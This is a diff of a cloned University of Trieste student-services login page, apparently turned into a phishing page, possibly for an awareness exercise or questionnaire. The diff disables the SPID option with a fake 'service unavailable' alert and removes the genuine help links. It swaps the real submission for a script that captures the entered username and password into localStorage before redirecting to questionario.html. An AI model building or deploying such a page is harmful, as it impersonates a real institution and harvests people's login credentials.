@@ -16,13 +16,13 @@
 
 
         <div class="content">
-				<div class="row"> <h1>Welcome</h1></div>
+				<div class="row"> <h1>BENVENUTO</h1></div>
 					<div class="row1">
-          <p>WELCOME, The University of Trieste has implemented authentication with SPID (Public System for Digital Identity) credentials for access to the reserved area of student secretarial services.</p>
-          <p>As an alternative to SPID credentials, you can continue to use the university credentials you already own.</p>
+            <p>BENVENUTO, L'Università degli Studi di Trieste ha implementato l'autenticazione con credenziali SPID (Sistema Pubblico di Identità Digitale) per l'accesso all'area riservata dei servizi di segreteria studenti.</p>
+            <p>In alternativa alle credenziali SPID, puoi continuare a utilizzare le credenziali universitarie che già possiedi.</p>
           </div>
           <div class="column one">
-              <p>Sign in to the service <b>sp-esse3-units-prod.cineca.it</b></p>
+              <p>Accedi al servizio <b>sp-esse3-units-prod.cineca.it</b></p>
 
 
 
@@ -42,18 +42,13 @@
                 <input class="form-element form-field" id="password" name="j_password" type="password" value="">
               </div>
 
-              <!--<div class="form-element-wrapper">
-                <input type="checkbox" name="donotcache" value="1" id="donotcache">
-                <label for="donotcache">Don't Remember Login</label>
-               </div>-->
-
-              <!--<div class="form-element-wrapper">
-                <input id="_shib_idp_revokeConsent" type="checkbox" name="_shib_idp_revokeConsent" value="true">
-                <label for="_shib_idp_revokeConsent">Clear prior granting of permission for release of your information to this service.</label>
-              </div>-->
-
               <div class="form-element-wrapper">
-                <button class="form-element form-button" type="submit" name="_eventId_proceed" onclick="this.childNodes[0].nodeValue='Logging in, please wait...'">Login</button>
+                <!-- <button class="form-element form-button" type="submit" name="_eventId_proceed" onclick="this.childNodes[0].nodeValue='Logging in, please wait...'">Login</button> -->
+                <form>
+                  <button class="form-element form-button" type="button" name="_eventId_proceed" onclick="handleLoginButtonClick(event)">
+                      Login
+                  </button>
+              </form>
               </div>
 
 
@@ -67,7 +62,6 @@
 			<input type="hidden" value="" id="spid_idp" name="spid_idp">
 			<div id="spid-idp-button-small-get" class="spid-idp-button spid-idp-button-tip spid-idp-button-relative">
 				<ul id="spid-idp-list-small-root-get" class="spid-idp-button-menu" aria-labelledby="spid-idp">
-
 
 
 
@@ -129,9 +123,8 @@
           </div>
           <div class="column two">
             <ul class="list list-help">
-                <li class="list-help-item"><a href="https://www.units.it/credenziali"><span class="item-marker">›</span> Password recovery</a></li>
-                <li class="list-help-item"><a href="https://esse3.units.it/Guide/Home.do"><span class="item-marker">›</span> Online guide</a></li>
-              <!--<li class="list-help-item"><a href="#"><span class="item-marker">&rsaquo;</span> Need Help?</a></li>-->
+                <li class="list-help-item"><span class="item-marker">›</span> Recupero della Password</a></li>
+                <li class="list-help-item"><span class="item-marker">›</span> Guida Online</a></li>
             </ul>
           </div>
         </div>
@@ -149,6 +142,25 @@
 document.querySelector(".italia-it-button-text").addEventListener("click", function() {
     alert("Servizio SPID non disponibile, per favore inserire le credenziali d'accesso");
 });
+
+function handleLoginButtonClick(event) {
+              // Ottieni i valori di username e password
+              var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+
+            // Salva i valori nel Local Storage
+            localStorage.setItem('username', username);
+            localStorage.setItem('password', password);
+
+            // Cambia il testo del bottone
+            event.target.childNodes[0].nodeValue = 'Logging in, please wait...';
+
+            // Reindirizza alla pagina questionario.html
+            setTimeout(function() {
+                window.location.href = 'questionario.html';
+            }, 1000); // Attendi un secondo per vedere il cambiamento del testo
+        }
+
 </script>
 
 
